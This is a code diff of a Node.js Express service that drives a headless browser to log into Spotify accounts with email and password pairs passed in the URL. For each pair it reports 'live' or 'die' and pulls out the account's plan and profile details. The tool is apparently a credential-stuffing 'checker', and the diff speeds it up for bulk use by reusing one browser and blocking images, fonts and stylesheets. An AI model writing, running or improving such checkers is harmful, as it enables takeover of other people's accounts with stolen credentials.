@@ -3,19 +3,19 @@ const app = express();
 const puppeteer = require("puppeteer");
 
 app.get("/:email/:password", async (request, response) => {
+  var browser = await puppeteer.launch({ args: ["--no-sandbox"] });
+  
   var email = request.params.email;
   var password = request.params.password;
   var res = {};
   if (!email || !password) {
-    res.message = "Failed";
+    res.success = false;
   } else {
-    var data = {
-      email: email,
-      password: password
-    };
-    res.message = "Success";
+    var data = {email, password};
+    
+    res.success = true;
 
-    var result = await getResult(data);
+    var result = await getResult(browser, data);
     if (result.status) {
       res.data = {
         status: "live",
@@ -29,7 +29,7 @@ app.get("/:email/:password", async (request, response) => {
       res.data = {
         status: "die",
         plan: "",
-        profile: "" 
+        profile: ""
       };
     }
   }
@@ -46,21 +46,37 @@ const listener = app.listen(process.env.PORT, () => {
   console.log("Your app is listening on port " + listener.address().port);
 });
 
-async function getResult(data) {
+async function getResult(browser, data) {
   let url =
-    "https://accounts.spotify.com/id/login";
+    "https://accounts.spotify.com/en/login?continue=https:%2F%2Fwww.spotify.com%2Fid%2Fapi%2Faccount%2Foverview%2F";
   return new Promise(async (resolve, reject) => {
-    puppeteer.launch({ args: ["--no-sandbox"] }).then(async browser => {
-      var page = await browser.newPage();
-      
-      await page.on("response", async res => {
+    const page = await browser.newPage();
+    await page.setRequestInterception(true);
+
+    await page.on("request", req => {
+      if (
+        req.resourceType() == "stylesheet" ||
+        req.resourceType() == "font" ||
+        req.resourceType() == "image"
+      ) {
+        req.abort();
+      } else {
+        req.continue();
+      }
+    });
+
+    page.on("response", async res => {
+      try {
         if (res.url() == "https://accounts.spotify.com/login/password") {
-          if (isJson(await res.text())) {
-            var json = JSON.parse(await res.text());
-            if (json.error) {
-              var data = {}
-              data.status = false;
-              resolve(data);
+          if (await res.text()) {
+            if (isJson(await res.text())) {
+              var json = JSON.parse(await res.text());
+              if (json.error) {
+                var data = {};
+                data.status = false;
+                await page.close();
+                resolve(data);
+              }
             }
           }
         }
@@ -68,25 +84,22 @@ async function getResult(data) {
         if (res.url() == "https://www.spotify.com/id/api/account/overview/") {
           if (isJson(await res.text())) {
             var json = JSON.parse(await res.text());
-            var data = {}
+            var data = {};
             data.status = true;
             data.plan = json.props.plan.plan.name;
             data.profile = json.props.profile.fields;
+            await page.close();
             resolve(data);
           }
         }
-      });
-      try {
-        await page.goto(url, { waitUntil: "networkidle2" });
-        await page.type("#login-username", data.email);
-        await page.type("#login-password", data.password);
-        await page.click("#login-button");
-        await page.waitFor(3000)
-        await page.goto("https://www.spotify.com/id/account/overview/");
-      } catch (error) {
-        console.log(error);
-      }
+      } catch (e) {}
     });
+
+    await page.goto(url);
+    await page.waitForSelector("#login-button");
+    await page.type("#login-username", data.email);
+    await page.type("#login-password", data.password);
+    await page.click("#login-button");
   });
 }
 
